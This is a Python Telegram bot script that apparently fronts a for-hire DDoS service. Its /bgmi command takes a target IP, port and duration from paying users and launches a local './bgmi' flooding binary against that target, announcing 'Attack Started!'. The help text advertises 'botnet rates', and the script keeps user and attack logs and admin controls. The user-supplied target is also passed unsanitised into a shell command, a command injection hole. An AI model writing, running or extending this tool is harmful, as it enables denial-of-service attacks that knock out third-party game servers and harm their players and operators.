#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import time
import os

# Insert your Telegram bot token here
bot = telebot.TeleBot('YOUR_BOT_TOKEN_HERE')

# Admin user IDs
admin_id = ["5689106127", "6910445402", "5696319794"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log commands
def log_command(user_id, target, port, time_duration):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time_duration}\n\n")

# Dictionary to track cooldown for the /bgmi command
bgmi_cooldown = {}

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in admin_id:
            # Check cooldown (5 minutes)
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
                bot.reply_to(message, "You are on cooldown. Please wait 5 minutes before running the /bgmi command again.")
                return
            
            bgmi_cooldown[user_id] = datetime.datetime.now()

        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])  
            time_duration = int(command[3])  

            if time_duration > 500:
                bot.reply_to(message, "Error: Time interval must be less than 500 seconds.")
                return

            log_command(user_id, target, port, time_duration)

            response = f"Attack Started!\n\nTarget: {target}\nPort: {port}\nDuration: {time_duration} seconds\nMethod: BGMI\nBy @Indivual1X"
            bot.reply_to(message, response)

            full_command = f"./bgmi {target} {port} {time_duration} 500"
            process = subprocess.Popen(full_command, shell=True)  # Run in background

            time.sleep(time_duration)  # Wait for the attack duration

            process.terminate()  # Stop the attack

            bot.reply_to(message, f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time_duration} seconds.")
        else:
            bot.reply_to(message, "Usage: /bgmi <target> <port> <time>\nBy @Indivual1X")
    else:
        bot.reply_to(message, "You are not authorized to use this command.\nBy @Indivual1X")

# Handler for /id command
@bot.message_handler(commands=['id'])
def show_user_id(message):
    bot.reply_to(message, f"Your ID: {message.chat.id}")

# Handler for /help command
@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''Available commands:
 /bgmi : Method for BGMI Servers.
 /rules : Please check before use.
 /mylogs : Check your recent attacks.
 /plan : Check our botnet rates.

Admin Commands:
/add <userId> : Add a user.
/remove <userId> : Remove a user.
/allusers : List all authorized users.
/logs : Show all users' logs.
/broadcast <message> : Send a message to all users.
/clearlogs : Clear logs.
'''
    bot.reply_to(message, help_text)

# Handler for /start command
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome, {user_name}! Type /help for available commands.\nBy @Indivual1X"
    bot.reply_to(message, response)

# Polling
bot.polling()
